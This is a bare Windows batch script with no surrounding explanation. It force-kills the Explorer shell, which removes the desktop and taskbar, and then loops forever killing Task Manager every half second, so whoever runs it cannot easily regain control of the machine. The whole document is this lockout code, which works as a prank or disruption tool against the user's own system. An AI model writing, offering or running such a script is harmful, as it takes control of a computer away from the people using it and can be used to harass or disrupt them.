TASKKILL /F /IM explorer.exe
:A
TASKKILL /F /IM Taskmgr.exe
TIMEOUT /T 0.5 /NOBREAK 
goto A